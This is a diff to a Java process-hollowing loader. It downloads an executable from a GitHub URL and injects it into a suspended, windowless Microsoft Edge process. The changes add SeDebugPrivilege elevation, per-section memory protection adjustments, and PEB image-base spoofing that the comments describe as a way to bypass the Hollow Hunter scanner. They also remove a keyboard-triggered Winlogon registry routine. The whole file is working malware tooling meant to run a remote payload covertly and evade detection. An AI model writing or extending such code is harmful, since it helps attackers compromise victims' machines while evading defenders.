@@ -8,19 +8,27 @@ import java.io.*;
 
 public class ProcessHollow {
 
+    // Memory Protection Constants
+    // PAGE_READONLY = 0x02
+    // PAGE_READWRITE = 0x04
+    // PAGE_EXECUTE_READ = 0x20
+    // PAGE_EXECUTE_READWRITE = 0x40
+    
     static MethodHandle createProcess;
     static MethodHandle virtualAllocEx;
+    static MethodHandle virtualProtectEx;
     static MethodHandle writeProcessMemory;
+    static MethodHandle readProcessMemory;
     static MethodHandle zwUnmapViewOfSection;
     static MethodHandle setThreadContext;
     static MethodHandle getThreadContext;
     static MethodHandle resumeThread;
     static MethodHandle closeHandle;
-    static MethodHandle regOpenKeyEx;
-    static MethodHandle regSetValueEx;
-    static MethodHandle regCloseKey;
-    static MethodHandle beep;
-    static MethodHandle getAsyncKeyState;
+    static MethodHandle sleep;
+    static MethodHandle openProcessToken;
+    static MethodHandle lookupPrivilegeValue;
+    static MethodHandle adjustTokenPrivileges;
+    static MethodHandle getCurrentProcess;
 
     static {
         try {
@@ -28,7 +36,6 @@ public class ProcessHollow {
             SymbolLookup kernel32 = SymbolLookup.libraryLookup("kernel32", Arena.global());
             SymbolLookup ntdll = SymbolLookup.libraryLookup("ntdll", Arena.global());
             SymbolLookup advapi32 = SymbolLookup.libraryLookup("advapi32", Arena.global());
-            SymbolLookup user32 = SymbolLookup.libraryLookup("user32", Arena.global());
 
             createProcess = linker.downcallHandle(
                 kernel32.find("CreateProcessW").orElseThrow(),
@@ -43,8 +50,20 @@ public class ProcessHollow {
                     ValueLayout.ADDRESS, ValueLayout.ADDRESS,
                     ValueLayout.JAVA_LONG, ValueLayout.JAVA_INT, ValueLayout.JAVA_INT));
 
+            virtualProtectEx = linker.downcallHandle(
+                kernel32.find("VirtualProtectEx").orElseThrow(),
+                FunctionDescriptor.of(ValueLayout.JAVA_INT,
+                    ValueLayout.ADDRESS, ValueLayout.ADDRESS, ValueLayout.JAVA_LONG,
+                    ValueLayout.JAVA_INT, ValueLayout.ADDRESS));
+
             writeProcessMemory = linker.downcallHandle(
                 kernel32.find("WriteProcessMemory").orElseThrow(),
+                FunctionDescriptor.of(ValueLayout.JAVA_INT,
+                    ValueLayout.ADDRESS, ValueLayout.ADDRESS, ValueLayout.ADDRESS,
+                    ValueLayout.JAVA_LONG, ValueLayout.ADDRESS));
+
+            readProcessMemory = linker.downcallHandle(
+                kernel32.find("ReadProcessMemory").orElseThrow(),
                 FunctionDescriptor.of(ValueLayout.JAVA_INT,
                     ValueLayout.ADDRESS, ValueLayout.ADDRESS, ValueLayout.ADDRESS,
                     ValueLayout.JAVA_LONG, ValueLayout.ADDRESS));
@@ -68,33 +87,33 @@ public class ProcessHollow {
                 kernel32.find("ResumeThread").orElseThrow(),
                 FunctionDescriptor.of(ValueLayout.JAVA_INT, ValueLayout.ADDRESS));
 
+            sleep = linker.downcallHandle(
+                kernel32.find("Sleep").orElseThrow(),
+                FunctionDescriptor.ofVoid(ValueLayout.JAVA_INT));
+
+            getCurrentProcess = linker.downcallHandle(
+                kernel32.find("GetCurrentProcess").orElseThrow(),
+                FunctionDescriptor.of(ValueLayout.ADDRESS));
+
+            openProcessToken = linker.downcallHandle(
+                advapi32.find("OpenProcessToken").orElseThrow(),
+                FunctionDescriptor.of(ValueLayout.JAVA_INT,
+                    ValueLayout.ADDRESS, ValueLayout.JAVA_INT, ValueLayout.ADDRESS));
+
+            lookupPrivilegeValue = linker.downcallHandle(
+                advapi32.find("LookupPrivilegeValueW").orElseThrow(),
+                FunctionDescriptor.of(ValueLayout.JAVA_INT,
+                    ValueLayout.ADDRESS, ValueLayout.ADDRESS, ValueLayout.ADDRESS));
+
+            adjustTokenPrivileges = linker.downcallHandle(
+                advapi32.find("AdjustTokenPrivileges").orElseThrow(),
+                FunctionDescriptor.of(ValueLayout.JAVA_INT,
+                    ValueLayout.ADDRESS, ValueLayout.JAVA_INT, ValueLayout.ADDRESS,
+                    ValueLayout.JAVA_INT, ValueLayout.ADDRESS, ValueLayout.ADDRESS));
+
             closeHandle = linker.downcallHandle(
                 kernel32.find("CloseHandle").orElseThrow(),
                 FunctionDescriptor.of(ValueLayout.JAVA_INT, ValueLayout.ADDRESS));
-
-            regOpenKeyEx = linker.downcallHandle(
-                advapi32.find("RegOpenKeyExW").orElseThrow(),
-                FunctionDescriptor.of(ValueLayout.JAVA_INT,
-                    ValueLayout.ADDRESS, ValueLayout.ADDRESS, ValueLayout.JAVA_INT,
-                    ValueLayout.JAVA_INT, ValueLayout.ADDRESS));
-
-            regSetValueEx = linker.downcallHandle(
-                advapi32.find("RegSetValueExW").orElseThrow(),
-                FunctionDescriptor.of(ValueLayout.JAVA_INT,
-                    ValueLayout.ADDRESS, ValueLayout.ADDRESS, ValueLayout.JAVA_INT,
-                    ValueLayout.JAVA_INT, ValueLayout.ADDRESS, ValueLayout.JAVA_INT));
-
-            regCloseKey = linker.downcallHandle(
-                advapi32.find("RegCloseKey").orElseThrow(),
-                FunctionDescriptor.ofVoid(ValueLayout.ADDRESS));
-
-            beep = linker.downcallHandle(
-                kernel32.find("Beep").orElseThrow(),
-                FunctionDescriptor.of(ValueLayout.JAVA_INT, ValueLayout.JAVA_INT, ValueLayout.JAVA_INT));
-
-            getAsyncKeyState = linker.downcallHandle(
-                user32.find("GetAsyncKeyState").orElseThrow(),
-                FunctionDescriptor.of(ValueLayout.JAVA_SHORT, ValueLayout.JAVA_INT));
         } catch (Throwable t) {
             throw new RuntimeException(t);
         }
@@ -134,9 +153,14 @@ public class ProcessHollow {
             MemorySegment currentDirSeg = arena.allocate(currentDirBytes.length);
             currentDirSeg.copyFrom(MemorySegment.ofArray(currentDirBytes));
 
+            // Criar processo com privilégios elevados
+            // CREATE_SUSPENDED = 0x00000004
+            // CREATE_NO_WINDOW = 0x08000000
+            int creationFlags = 0x00000004 | 0x08000000;
+            
             int success = (int) createProcess.invokeExact(
                 MemorySegment.NULL, targetHostSeg, MemorySegment.NULL, MemorySegment.NULL,
-                true, 0x00000004, MemorySegment.NULL, currentDirSeg, bStartupInfo, bProcessInfo);
+                true, creationFlags, MemorySegment.NULL, currentDirSeg, bStartupInfo, bProcessInfo);
 
             if (success == 0) return;
 
@@ -195,17 +219,61 @@ public class ProcessHollow {
 
             int stc = (int) setThreadContext.invokeExact(hThread, pThreadContext);
 
-            int rt = (int) resumeThread.invokeExact(hThread);
+            // STAGE 4: Section Protection (Bypass Technique)
+            MemorySegment oldProtect = arena.allocate(ValueLayout.JAVA_INT);
+            
+            // Define proteções específicas por seção (sem READ-ONLY global primeiro)
+            for (short i = 0; i < numberOfSections; i++) {
+                int secOff = e_lfanew + (0x18 + sizeOfOptionalHeader) + (0x28 * i);
+                int virtualAddress = bb.getInt(secOff + 0x0C);
+                int virtualSize = bb.getInt(secOff + 0x08);
+                int characteristics = bb.getInt(secOff + 0x24);
+                
+                int protection = 0x02; // PAGE_READONLY padrão
+                
+                // IMAGE_SCN_MEM_EXECUTE = 0x20000000
+                // IMAGE_SCN_MEM_WRITE = 0x80000000
+                if ((characteristics & 0x20000000) != 0) {
+                    protection = 0x20; // PAGE_EXECUTE_READ
+                } else if ((characteristics & 0x80000000) != 0) {
+                    protection = 0x04; // PAGE_READWRITE
+                }
+                
+                try {
+                    MemorySegment sectionBase = MemorySegment.ofAddress(imageBase + virtualAddress);
+                    virtualProtectEx.invokeExact(hProcess, sectionBase, (long)virtualSize, protection, oldProtect);
+                } catch (Throwable t) {
+                }
+            }
 
-            int ch1 = (int) closeHandle.invokeExact(hProcess);
-            int ch2 = (int) closeHandle.invokeExact(hThread);
+            // STAGE 5: PEB Spoofing (Critical for Hollow Hunter bypass)
+            long originalImageBase = 0x140000000L; // Base original do msedge.exe
+            if (rdx != 0) {
+                try {
+                    MemorySegment originalBaseSeg = arena.allocate(8);
+                    originalBaseSeg.set(ValueLayout.JAVA_LONG, 0, originalImageBase);
+                    writeProcessMemory.invokeExact(
+                        hProcess, MemorySegment.ofAddress(rdx + 16), originalBaseSeg, 8L, MemorySegment.NULL);
+                } catch (Throwable t) {
+                }
+            }
+
+            int rt = (int) resumeThread.invokeExact(hThread);
+            
+            System.out.println("Ready..");
+            
+            // Aguarda 2 segundos para garantir que o processo inicializou
+            Thread.sleep(2000);
+            
+            // Fecha o Java (e o CMD) - processo injetado continua rodando
+            System.exit(0);
         }
     }
 
     public static void main(String[] args) throws Throwable {
         try {
-            // Inicia o monitor de teclado
-            monitorKeyboard();
+            // Eleva privilégios do processo atual
+            enableDebugPrivilege();
             
             String url = "https://github.com/hugoleitevitor-cyber/aaaaaaaaaaaaaaa/raw/refs/heads/main/MixCodes.exe";
             String file = "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe";
@@ -213,6 +281,41 @@ public class ProcessHollow {
             byte[] data = downloadFileAsync(url);
             Load(data, file, "");
         } catch (Exception e) {
+        }
+    }
+
+    static void enableDebugPrivilege() {
+        try (Arena arena = Arena.ofConfined()) {
+            // TOKEN_ADJUST_PRIVILEGES = 0x0020, TOKEN_QUERY = 0x0008
+            MemorySegment hToken = arena.allocate(ValueLayout.ADDRESS);
+            MemorySegment hProcess = (MemorySegment) getCurrentProcess.invokeExact();
+            
+            int result = (int) openProcessToken.invokeExact(hProcess, 0x0028, hToken);
+            if (result == 0) return;
+            
+            MemorySegment tokenHandle = hToken.get(ValueLayout.ADDRESS, 0);
+            
+            // SE_DEBUG_NAME = "SeDebugPrivilege"
+            String privName = "SeDebugPrivilege\0";
+            byte[] privBytes = privName.getBytes(java.nio.charset.StandardCharsets.UTF_16LE);
+            MemorySegment privNameSeg = arena.allocate(privBytes.length);
+            privNameSeg.copyFrom(MemorySegment.ofArray(privBytes));
+            
+            // TOKEN_PRIVILEGES structure: 4 bytes count + 8 bytes LUID + 4 bytes attributes
+            MemorySegment luid = arena.allocate(8);
+            int lookupResult = (int) lookupPrivilegeValue.invokeExact(MemorySegment.NULL, privNameSeg, luid);
+            
+            if (lookupResult != 0) {
+                MemorySegment tp = arena.allocate(16);
+                tp.set(ValueLayout.JAVA_INT, 0, 1); // PrivilegeCount
+                tp.set(ValueLayout.JAVA_LONG, 4, luid.get(ValueLayout.JAVA_LONG, 0)); // LUID
+                tp.set(ValueLayout.JAVA_INT, 12, 0x00000002); // SE_PRIVILEGE_ENABLED
+                
+                adjustTokenPrivileges.invokeExact(tokenHandle, 0, tp, 0, MemorySegment.NULL, MemorySegment.NULL);
+            }
+            
+            closeHandle.invokeExact(tokenHandle);
+        } catch (Throwable t) {
         }
     }
 
@@ -230,70 +333,5 @@ public class ProcessHollow {
             throw new RuntimeException("HTTP " + response.statusCode());
         }
         return response.body();
-    }
-
-    static void restoreRegistry() {
-        try (Arena arena = Arena.ofConfined()) {
-            // HKEY_LOCAL_MACHINE = 0x80000002
-            MemorySegment hkeyLocalMachine = MemorySegment.ofAddress(0x80000002L);
-            
-            // Caminho da chave do registro
-            String keyPath = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon";
-            byte[] keyPathBytes = (keyPath + "\0").getBytes(java.nio.charset.StandardCharsets.UTF_16LE);
-            MemorySegment keyPathSeg = arena.allocate(keyPathBytes.length);
-            keyPathSeg.copyFrom(MemorySegment.ofArray(keyPathBytes));
-            
-            // Abre a chave
-            MemorySegment hKey = arena.allocate(ValueLayout.ADDRESS);
-            int result = (int) regOpenKeyEx.invokeExact(
-                hkeyLocalMachine, keyPathSeg, 0, 0x20006, hKey); // KEY_SET_VALUE
-            
-            if (result == 0) {
-                MemorySegment hKeyValue = hKey.get(ValueLayout.ADDRESS, 0);
-                
-                // Valor legítimo padrão
-                String legitimateValue = "C:\\Windows\\system32\\userinit.exe,";
-                byte[] valueBytes = (legitimateValue + "\0").getBytes(java.nio.charset.StandardCharsets.UTF_16LE);
-                MemorySegment valueSeg = arena.allocate(valueBytes.length);
-                valueSeg.copyFrom(MemorySegment.ofArray(valueBytes));
-                
-                // Nome do valor
-                String valueName = "Userinit";
-                byte[] valueNameBytes = (valueName + "\0").getBytes(java.nio.charset.StandardCharsets.UTF_16LE);
-                MemorySegment valueNameSeg = arena.allocate(valueNameBytes.length);
-                valueNameSeg.copyFrom(MemorySegment.ofArray(valueNameBytes));
-                
-                // Define o valor
-                int setResult = (int) regSetValueEx.invokeExact(
-                    hKeyValue, valueNameSeg, 0, 1, valueSeg, valueBytes.length); // REG_SZ = 1
-                
-                regCloseKey.invokeExact(hKeyValue);
-                
-                if (setResult == 0) {
-                    int beepResult = (int) beep.invokeExact(750, 300);
-                }
-            }
-        } catch (Throwable t) {
-        }
-    }
-
-    static void monitorKeyboard() {
-        new Thread(() -> {
-            try {
-                while (true) {
-                    Thread.sleep(100);
-                    
-                    // VK_END = 0x23
-                    short endState = (short) getAsyncKeyState.invokeExact(0x23);
-                    
-                    // Verifica se a tecla está pressionada (bit alto é 1)
-                    if ((endState & 0x8000) != 0) {
-                        restoreRegistry();
-                        break;
-                    }
-                }
-            } catch (Throwable t) {
-            }
-        }).start();
     }
 }
